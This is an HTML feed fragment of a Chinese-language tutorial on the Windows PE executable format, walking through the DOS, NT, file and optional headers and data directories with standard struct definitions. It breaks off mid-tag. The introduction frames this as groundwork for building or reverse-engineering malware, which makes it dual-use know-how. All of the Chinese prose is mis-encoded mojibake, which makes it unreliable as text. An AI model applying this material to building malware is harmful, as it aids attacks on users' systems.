        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p><strong>Portable Executable (PE)</strong> æ˜¯ Windows ç³»ç»Ÿä¸Šå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶æ ¼å¼ã€‚PE æ–‡ä»¶æ‰©å±•åçš„å‡ ä¸ªç¤ºä¾‹åŒ…æ‹¬ <code>.exe</code>ã€<code>.dll</code>ã€<code>.sys</code> å’Œ <code>.scr</code>ã€‚æœ¬æ¨¡å—è®¨è®º PE æ–‡ä»¶çš„ç»“æ„ï¼Œè¿™å¯¹äºæ„å»ºæˆ–é€†å‘å·¥ç¨‹æ¶æ„è½¯ä»¶éå¸¸é‡è¦ã€‚</p><p>è¯·æ³¨æ„ï¼Œæœ¬æ¨¡å—åŠæœªæ¥çš„æ¨¡å—å°†ç»å¸¸äº’æ¢ä½¿ç”¨â€œå¯æ‰§è¡Œæ–‡ä»¶â€ï¼ˆä¾‹å¦‚ EXEã€DLLï¼‰å’Œâ€œé•œåƒâ€ï¼ˆImagesï¼‰æ¥æŒ‡ä»£è¿™äº›æ–‡ä»¶ã€‚</p><h1 id="PEç»“æ„"><a href="#PEç»“æ„" class="headerlink" title="PEç»“æ„"></a>PEç»“æ„</h1><p>ä¸‹å›¾å±•ç¤ºäº†ä¸€ä¸ªç®€åŒ–çš„ <strong>Portable Executable (PE)</strong> ç»“æ„ã€‚å›¾ä¸­æ˜¾ç¤ºçš„æ¯ä¸ªå¤´éƒ¨éƒ½è¢«å®šä¹‰ä¸ºä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œè¯¥ç»“æ„åŒ…å«å…³äº PE æ–‡ä»¶çš„ä¿¡æ¯ã€‚æœ¬æ¨¡å—å°†è¯¦ç»†è§£é‡Šæ¯ä¸ªæ•°æ®ç»“æ„ã€‚<br><img src="/Rxi134_FILE/4671b85da7b3108123c5f23d8748a504_MD5.jpeg"></p><p><img src="/Rxi134_FILE/07427b54f2cd6658fb90b65947539444_MD5.jpeg"></p><h2 id="DOS-å¤´-IMAGE-DOS-HEADER-ï¼‰"><a href="#DOS-å¤´-IMAGE-DOS-HEADER-ï¼‰" class="headerlink" title="DOS å¤´ (IMAGE_DOS_HEADER)ï¼‰"></a>DOS å¤´ (IMAGE_DOS_HEADER)ï¼‰</h2><p>PE æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªå¤´éƒ¨æ€»æ˜¯ä»¥ä¸¤ä¸ªå­—èŠ‚å¼€å¤´ï¼Œåˆ†åˆ«æ˜¯ <code>0x4D</code> å’Œ <code>0x5A</code>ï¼Œé€šå¸¸ç§°ä¸º **<code>MZ</code>**ã€‚è¿™ä¸¤ä¸ªå­—èŠ‚ä»£è¡¨ DOS å¤´éƒ¨çš„ç­¾åï¼Œç”¨äºç¡®è®¤æ­£åœ¨è§£ææˆ–æ£€æŸ¥çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PE æ–‡ä»¶ã€‚<br><img src="/Rxi134_FILE/bdd280e07e2ab3e4ea79f3a64f88be18_MD5.jpeg"></p><p><strong>DOS å¤´éƒ¨</strong> æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DOS_HEADER</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// DOS .EXE header</span>    WORD   e_magic<span class="token punctuation">;</span>                     <span class="token comment">// Magic number</span>    WORD   e_cblp<span class="token punctuation">;</span>                      <span class="token comment">// Bytes on last page of file</span>    WORD   e_cp<span class="token punctuation">;</span>                        <span class="token comment">// Pages in file</span>    WORD   e_crlc<span class="token punctuation">;</span>                      <span class="token comment">// Relocations</span>    WORD   e_cparhdr<span class="token punctuation">;</span>                   <span class="token comment">// Size of header in paragraphs</span>    WORD   e_minalloc<span class="token punctuation">;</span>                  <span class="token comment">// Minimum extra paragraphs needed</span>    WORD   e_maxalloc<span class="token punctuation">;</span>                  <span class="token comment">// Maximum extra paragraphs needed</span>    WORD   e_ss<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) SS value</span>    WORD   e_sp<span class="token punctuation">;</span>                        <span class="token comment">// Initial SP value</span>    WORD   e_csum<span class="token punctuation">;</span>                      <span class="token comment">// Checksum</span>    WORD   e_ip<span class="token punctuation">;</span>                        <span class="token comment">// Initial IP value</span>    WORD   e_cs<span class="token punctuation">;</span>                        <span class="token comment">// Initial (relative) CS value</span>    WORD   e_lfarlc<span class="token punctuation">;</span>                    <span class="token comment">// File address of relocation table</span>    WORD   e_ovno<span class="token punctuation">;</span>                      <span class="token comment">// Overlay number</span>    WORD   e_res<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment">// Reserved words</span>    WORD   e_oemid<span class="token punctuation">;</span>                     <span class="token comment">// OEM identifier (for e_oeminfo)</span>    WORD   e_oeminfo<span class="token punctuation">;</span>                   <span class="token comment">// OEM information; e_oemid specific</span>    WORD   e_res2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token comment">// Reserved words</span>    LONG   e_lfanew<span class="token punctuation">;</span>                    <span class="token comment">// Offset to the NT header</span>  <span class="token punctuation">&#125;</span> IMAGE_DOS_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DOS_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æ„ä½“ä¸­æœ€é‡è¦çš„æˆå‘˜æ˜¯ <strong><code>e_magic</code></strong> å’Œ **<code>e_lfanew</code>**ã€‚</p><ul><li><strong><code>e_magic</code></strong>Â æ˜¯ä¸€ä¸ª 2 å­—èŠ‚çš„å€¼ï¼Œå›ºå®šå€¼ä¸ºÂ <code>0x5A4D</code>Â æˆ–Â <strong>MZ</strong>ã€‚</li><li><strong><code>e_lfanew</code></strong>Â æ˜¯ä¸€ä¸ª 4 å­—èŠ‚çš„å€¼ï¼Œä¿å­˜ NT å¤´éƒ¨çš„èµ·å§‹åç§»é‡ã€‚æ³¨æ„ï¼Œ**<code>e_lfanew</code>**Â æ€»æ˜¯ä½äºåç§»é‡Â <code>0x3C</code>Â å¤„ã€‚</li></ul><h2 id="DOS-å­˜æ ¹"><a href="#DOS-å­˜æ ¹" class="headerlink" title="DOS å­˜æ ¹"></a>DOS å­˜æ ¹</h2><p>åœ¨è¿›å…¥ NT å¤´éƒ¨ç»“æ„ä¹‹å‰ï¼Œæœ‰ä¸€ä¸ª <strong>DOS stub</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œæ‰“å°å†…å®¹ä¸º â€œ<code>This program cannot be run in DOS mode</code>â€œï¼ˆè¯¥ç¨‹åºæ— æ³•åœ¨ DOS æ¨¡å¼ä¸‹è¿è¡Œï¼‰ï¼Œå½“ç¨‹åºåœ¨ DOS æ¨¡å¼æˆ– â€œç£ç›˜æ“ä½œæ¨¡å¼â€ ä¸‹åŠ è½½æ—¶ä¼šæ˜¾ç¤ºæ­¤æ¶ˆæ¯ã€‚<br><img src="/Rxi134_FILE/9ee4b3e681f049fd506307b7241a8f30_MD5.jpeg"></p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªé”™è¯¯æ¶ˆæ¯å¯ä»¥ç”±ç¨‹åºå‘˜åœ¨ç¼–è¯‘æ—¶æ›´æ”¹ã€‚è™½ç„¶è¿™ä¸æ˜¯ PE å¤´éƒ¨çš„ä¸€éƒ¨åˆ†ï¼Œä½†äº†è§£å®ƒæ˜¯æœ‰ç›Šçš„ã€‚</p><h2 id="NT-å¤´-IMAGE-NT-HEADERS"><a href="#NT-å¤´-IMAGE-NT-HEADERS" class="headerlink" title="NT å¤´ (IMAGE_NT_HEADERS)"></a>NT å¤´ (IMAGE_NT_HEADERS)</h2><p>NT å¤´éƒ¨éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒåŒ…å«äº†å¦å¤–ä¸¤ä¸ªé•œåƒå¤´éƒ¨ï¼š<strong>FileHeader</strong> å’Œ <strong>OptionalHeader</strong>ï¼Œè¿™ä¸¤ä¸ªå¤´éƒ¨åŒ…å«äº†å…³äº PE æ–‡ä»¶çš„å¤§é‡ä¿¡æ¯ã€‚</p><p>ä¸ DOS å¤´éƒ¨ç±»ä¼¼ï¼ŒNT å¤´éƒ¨ä¹ŸåŒ…å«ä¸€ä¸ªç”¨äºéªŒè¯çš„ç­¾åæˆå‘˜ã€‚é€šå¸¸ï¼Œç­¾åå…ƒç´ ç­‰äºå­—ç¬¦ä¸² â€œPEâ€ï¼Œå…¶ç”± <code>0x50</code> å’Œ <code>0x45</code> å­—èŠ‚è¡¨ç¤ºã€‚ä½†ç”±äºç­¾åæ˜¯ <code>DWORD</code> æ•°æ®ç±»å‹ï¼Œç­¾åä¼šè¡¨ç¤ºä¸º <code>0x50450000</code>ï¼Œè™½ç„¶è¢«å¡«å……äº†ä¸¤ä¸ªç©ºå­—èŠ‚ï¼Œä»ç„¶è¡¨ç¤ºä¸º â€œPEâ€ã€‚<br><img src="/Rxi134_FILE/944b333c6cedabdb55da4a43db439843_MD5.jpeg"></p><p>NT å¤´éƒ¨å¯ä»¥é€šè¿‡ DOS å¤´éƒ¨ä¸­çš„æˆå‘˜ <strong><code>e_lfanew</code></strong> æ¥è®¿é—®ï¼Œå¦‚å›¾ï¼Œ0xf0 æ­£æ˜¯ NTå¤´ çš„åç§»<br><img src="/Rxi134_FILE/33058c354ba66ad27a5820d995f0e148_MD5.jpeg"></p><p>NT å¤´éƒ¨çš„ç»“æ„ä¼šæ ¹æ®æœºå™¨çš„æ¶æ„è€Œæœ‰æ‰€ä¸åŒã€‚</p><ul><li>32 ä½ç‰ˆæœ¬ï¼š<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS</span> <span class="token punctuation">&#123;</span>  DWORD                   Signature<span class="token punctuation">;</span>  IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>  IMAGE_OPTIONAL_HEADER32 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>64 ä½ç‰ˆæœ¬ï¼š<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_NT_HEADERS64</span> <span class="token punctuation">&#123;</span>    DWORD                   Signature<span class="token punctuation">;</span>    IMAGE_FILE_HEADER       FileHeader<span class="token punctuation">;</span>    IMAGE_OPTIONAL_HEADER64 OptionalHeader<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_NT_HEADERS64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_NT_HEADERS64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>å”¯ä¸€çš„åŒºåˆ«åœ¨äºæ•°æ®ç»“æ„ <strong><code>OptionalHeader</code></strong> ï¼Œæ˜¯ <strong><code>IMAGE_OPTIONAL_HEADER32</code></strong> æˆ– **<code>IMAGE_OPTIONAL_HEADER64</code>**ï¼Œåˆ†åˆ«ç”¨äº 32 ä½å’Œ 64 ä½æ¶æ„ã€‚</p><h3 id="æ–‡ä»¶å¤´-IMAGE-FILE-HEADER"><a href="#æ–‡ä»¶å¤´-IMAGE-FILE-HEADER" class="headerlink" title="æ–‡ä»¶å¤´ (IMAGE_FILE_HEADER)"></a>æ–‡ä»¶å¤´ (IMAGE_FILE_HEADER)</h3><p>æ¥ä¸‹æ¥æ˜¯å¯ä»¥ä»ä¹‹å‰çš„ NT å¤´éƒ¨æ•°æ®ç»“æ„è®¿é—®çš„å¤´éƒ¨ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_FILE_HEADER</span> <span class="token punctuation">&#123;</span>  WORD  Machine<span class="token punctuation">;</span>  WORD  NumberOfSections<span class="token punctuation">;</span>  DWORD TimeDateStamp<span class="token punctuation">;</span>  DWORD PointerToSymbolTable<span class="token punctuation">;</span>  DWORD NumberOfSymbols<span class="token punctuation">;</span>  WORD  SizeOfOptionalHeader<span class="token punctuation">;</span>  WORD  Characteristics<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_FILE_HEADER<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_FILE_HEADER<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€é‡è¦çš„ç»“æ„ä½“æˆå‘˜æ˜¯ï¼š</p><ul><li><strong><code>NumberOfSections</code></strong>Â - PE æ–‡ä»¶ä¸­çš„æ®µæ•°é‡ï¼ˆç¨åè®¨è®ºï¼‰ã€‚</li><li><strong><code>Characteristics</code></strong>Â - æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶æŸäº›å±æ€§çš„æ ‡å¿—ï¼Œæ¯”å¦‚å®ƒæ˜¯å¦æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰æˆ–æ§åˆ¶å°åº”ç”¨ç¨‹åºã€‚</li><li><strong><code>SizeOfOptionalHeader</code></strong>Â - åç»­å¯é€‰å¤´éƒ¨çš„å¤§å°ã€‚<br>å…³äºæ–‡ä»¶å¤´éƒ¨çš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨å®˜æ–¹æ–‡æ¡£é¡µé¢ä¸­æ‰¾åˆ°ã€‚<a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header">official documentation page</a>.</li></ul><h3 id="å¯é€‰å¤´éƒ¨-IMAGE-OPTIONAL-HEADER"><a href="#å¯é€‰å¤´éƒ¨-IMAGE-OPTIONAL-HEADER" class="headerlink" title="å¯é€‰å¤´éƒ¨ (IMAGE_OPTIONAL_HEADER)"></a>å¯é€‰å¤´éƒ¨ (IMAGE_OPTIONAL_HEADER)</h3><p>å¯é€‰å¤´éƒ¨éå¸¸é‡è¦ï¼Œå°½ç®¡å®ƒè¢«ç§°ä¸º â€œå¯é€‰â€ ï¼Œä½†å¯¹ PE æ–‡ä»¶çš„æ‰§è¡Œè‡³å…³é‡è¦ã€‚ä¹‹æ‰€ä»¥ç§°å®ƒä¸ºâ€œå¯é€‰â€ï¼Œæ˜¯å› ä¸ºæŸäº›æ–‡ä»¶ç±»å‹æ²¡æœ‰è¿™ä¸ªå¤´éƒ¨ã€‚</p><p>å¯é€‰å¤´éƒ¨æœ‰ä¸¤ä¸ªç‰ˆæœ¬ï¼Œåˆ†åˆ«ç”¨äº 32 ä½å’Œ 64 ä½ç³»ç»Ÿã€‚ä¸¤ä¸ªç‰ˆæœ¬çš„æ•°æ®ç»“æ„å‡ ä¹ç›¸åŒï¼Œä¸»è¦åŒºåˆ«åœ¨äºæŸäº›æˆå‘˜çš„å¤§å°ã€‚**<code>ULONGLONG</code>** ç”¨äº 64 ä½ç‰ˆæœ¬ï¼Œ**<code>DWORD</code>** ç”¨äº 32 ä½ç‰ˆæœ¬ã€‚æ­¤å¤–ï¼Œ32 ä½ç‰ˆæœ¬ä¸­æœ‰ä¸€äº›åœ¨ 64 ä½ç‰ˆæœ¬ä¸­ä¸å­˜åœ¨çš„æˆå‘˜ã€‚</p><ul><li><p>32 ä½ç‰ˆæœ¬</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  DWORD                BaseOfData<span class="token punctuation">;</span>  DWORD                ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  DWORD                SizeOfStackReserve<span class="token punctuation">;</span>  DWORD                SizeOfStackCommit<span class="token punctuation">;</span>  DWORD                SizeOfHeapReserve<span class="token punctuation">;</span>  DWORD                SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER32<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER32<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>64ä½ç‰ˆæœ¬</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_OPTIONAL_HEADER64</span> <span class="token punctuation">&#123;</span>  WORD                 Magic<span class="token punctuation">;</span>  BYTE                 MajorLinkerVersion<span class="token punctuation">;</span>  BYTE                 MinorLinkerVersion<span class="token punctuation">;</span>  DWORD                SizeOfCode<span class="token punctuation">;</span>  DWORD                SizeOfInitializedData<span class="token punctuation">;</span>  DWORD                SizeOfUninitializedData<span class="token punctuation">;</span>  DWORD                AddressOfEntryPoint<span class="token punctuation">;</span>  DWORD                BaseOfCode<span class="token punctuation">;</span>  ULONGLONG            ImageBase<span class="token punctuation">;</span>  DWORD                SectionAlignment<span class="token punctuation">;</span>  DWORD                FileAlignment<span class="token punctuation">;</span>  WORD                 MajorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MinorOperatingSystemVersion<span class="token punctuation">;</span>  WORD                 MajorImageVersion<span class="token punctuation">;</span>  WORD                 MinorImageVersion<span class="token punctuation">;</span>  WORD                 MajorSubsystemVersion<span class="token punctuation">;</span>  WORD                 MinorSubsystemVersion<span class="token punctuation">;</span>  DWORD                Win32VersionValue<span class="token punctuation">;</span>  DWORD                SizeOfImage<span class="token punctuation">;</span>  DWORD                SizeOfHeaders<span class="token punctuation">;</span>  DWORD                CheckSum<span class="token punctuation">;</span>  WORD                 Subsystem<span class="token punctuation">;</span>  WORD                 DllCharacteristics<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfStackCommit<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapReserve<span class="token punctuation">;</span>  ULONGLONG            SizeOfHeapCommit<span class="token punctuation">;</span>  DWORD                LoaderFlags<span class="token punctuation">;</span>  DWORD                NumberOfRvaAndSizes<span class="token punctuation">;</span>  IMAGE_DATA_DIRECTORY DataDirectory<span class="token punctuation">[</span>IMAGE_NUMBEROF_DIRECTORY_ENTRIES<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> IMAGE_OPTIONAL_HEADER64<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_OPTIONAL_HEADER64<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>å¯é€‰å¤´éƒ¨åŒ…å«äº†å¤§é‡æœ‰ç”¨çš„ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ç»“æ„ä½“æˆå‘˜ï¼š</p><ul><li><strong><code>Magic</code></strong>Â - æè¿°é•œåƒæ–‡ä»¶çš„çŠ¶æ€ï¼ˆ32 ä½æˆ– 64 ä½é•œåƒï¼‰ã€‚</li><li><strong><code>MajorOperatingSystemVersion</code></strong>Â - æ‰€éœ€æ“ä½œç³»ç»Ÿçš„ä¸»è¦ç‰ˆæœ¬å·ï¼ˆä¾‹å¦‚ 11, 10ï¼‰ã€‚</li><li><strong><code>MinorOperatingSystemVersion</code></strong>Â - æ‰€éœ€æ“ä½œç³»ç»Ÿçš„æ¬¡è¦ç‰ˆæœ¬å·ï¼ˆä¾‹å¦‚ 1511, 1507, 1607ï¼‰ã€‚</li><li><strong><code>SizeOfCode</code></strong>Â - ä»£ç æ®µçš„å¤§å°ï¼ˆç¨åè®¨è®ºï¼‰ã€‚</li><li><strong><code>AddressOfEntryPoint</code></strong>Â - æ–‡ä»¶çš„å…¥å£ç‚¹åç§»é‡ï¼ˆé€šå¸¸ä¸ºÂ <code>main</code>Â å‡½æ•°çš„åç§»ï¼‰ã€‚</li><li><strong><code>BaseOfCode</code></strong>Â - ä»£ç æ®µèµ·å§‹ä½ç½®çš„åç§»é‡ã€‚</li><li><strong><code>SizeOfImage</code></strong>Â - é•œåƒæ–‡ä»¶çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚</li><li><strong><code>ImageBase</code></strong>Â - æŒ‡å®šåº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œæ—¶è¦åŠ è½½åˆ°å†…å­˜ä¸­çš„é¦–é€‰åœ°å€ã€‚ç„¶è€Œï¼Œç”±äº Windows çš„å†…å­˜ä¿æŠ¤æœºåˆ¶ï¼ˆä¾‹å¦‚åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ŒASLRï¼‰ï¼Œå¾ˆå°‘è§åˆ°é•œåƒæ˜ å°„åˆ°å…¶é¦–é€‰åœ°å€ï¼Œå› ä¸º Windows PE åŠ è½½å™¨ä¼šå°†æ–‡ä»¶æ˜ å°„åˆ°ä¸åŒçš„åœ°å€ã€‚Windows PE åŠ è½½å™¨è¿›è¡Œçš„è¿™ç§éšæœºåˆ†é…ä¼šåœ¨å®ç°æœªæ¥æŠ€æœ¯æ—¶å¯¼è‡´é—®é¢˜ï¼Œå› ä¸ºæŸäº›è¢«è®¤ä¸ºæ˜¯å¸¸é‡çš„åœ°å€å‘ç”Ÿäº†å˜åŒ–ã€‚ä¹‹åï¼ŒWindows PE åŠ è½½å™¨ä¼šé€šè¿‡ PE é‡å®šä½æ¥ä¿®å¤è¿™äº›åœ°å€ã€‚</li><li><strong><code>DataDirectory</code></strong>Â - å¯é€‰å¤´éƒ¨ä¸­æœ€é‡è¦çš„æˆå‘˜ä¹‹ä¸€ã€‚å®ƒæ˜¯ä¸€ä¸ªÂ <strong><code>IMAGE_DATA_DIRECTORY</code></strong>Â çš„æ•°ç»„ï¼ŒåŒ…å« PE æ–‡ä»¶ä¸­çš„ç›®å½•ï¼ˆç¨åè®¨è®ºï¼‰ã€‚</li></ul><h4 id="æ•°æ®ç›®å½•-Data-Directory"><a href="#æ•°æ®ç›®å½•-Data-Directory" class="headerlink" title="æ•°æ®ç›®å½• Data Directory"></a>æ•°æ®ç›®å½• Data Directory</h4><p>å¯ä»¥é€šè¿‡å¯é€‰å¤´çš„æœ€åä¸€ä¸ªæˆå‘˜æ¥è®¿é—®æ•°æ®ç›®å½•ï¼ˆData Directoryï¼‰ã€‚è¯¥æˆå‘˜æ˜¯ä¸€ä¸ª <code>IMAGE_DATA_DIRECTORY</code> æ•°æ®ç±»å‹çš„æ•°ç»„ï¼Œå…¶æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_IMAGE_DATA_DIRECTORY</span> <span class="token punctuation">&#123;</span>    DWORD   VirtualAddress<span class="token punctuation">;</span>  <span class="token comment">// è™šæ‹Ÿåœ°å€</span>    DWORD   Size<span class="token punctuation">;</span>            <span class="token comment">// å¤§å°</span><span class="token punctuation">&#125;</span> IMAGE_DATA_DIRECTORY<span class="token punctuation">,</span> <span class="token operator">*</span>PIMAGE_DATA_DIRECTORY<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ•°æ®ç›®å½•æ•°ç»„çš„å¤§å°ç”±å¸¸é‡ <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> å†³å®šï¼Œå…¶å€¼ä¸º 16ã€‚æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è¡¨ç¤ºä¸€ä¸ªç‰¹å®šçš„æ•°æ®ç›®å½•ï¼ŒåŒ…å«äº†æŸä¸ª PE èŠ‚ï¼ˆsectionï¼‰æˆ–æ•°æ®è¡¨ï¼ˆData Tableï¼‰çš„ä¸€äº›æ•°æ®ï¼ˆå³å­˜å‚¨ PE å…·ä½“ä¿¡æ¯çš„åœ°æ–¹ï¼‰ã€‚</p><p>å¯ä»¥é€šè¿‡æ•°ç»„çš„ç´¢å¼•æ¥è®¿é—®ç‰¹å®šçš„æ•°æ®ç›®å½•ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXPORT</span>          <span class="token expression"><span class="token number">0</span>   </span><span class="token comment">// Export Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_IMPORT</span>          <span class="token expression"><span class="token number">1</span>   </span><span class="token comment">// Import Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_RESOURCE</span>        <span class="token expression"><span class="token number">2</span>   </span><span class="token comment">// Resource Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_EXCEPTION</span>       <span class="token expression"><span class="token number">3</span>   </span><span class="token comment">// Exception Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_SECURITY</span>        <span class="token expression"><span class="token number">4</span>   </span><span class="token comment">// Security Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_BASERELOC</span>       <span class="token expression"><span class="token number">5</span>   </span><span class="token comment">// Base Relocation Table</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_DEBUG</span>           <span class="token expression"><span class="token number">6</span>   </span><span class="token comment">// Debug Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</span>    <span class="token expression"><span class="token number">7</span>   </span><span class="token comment">// Architecture Specific Data</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_GLOBALPTR</span>       <span class="token expression"><span class="token number">8</span>   </span><span class="token comment">// RVA of GP</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_TLS</span>             <span class="token expression"><span class="token number">9</span>   </span><span class="token comment">// TLS Directory</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</span>    <span class="token expression"><span class="token number">10</span>   </span><span class="token 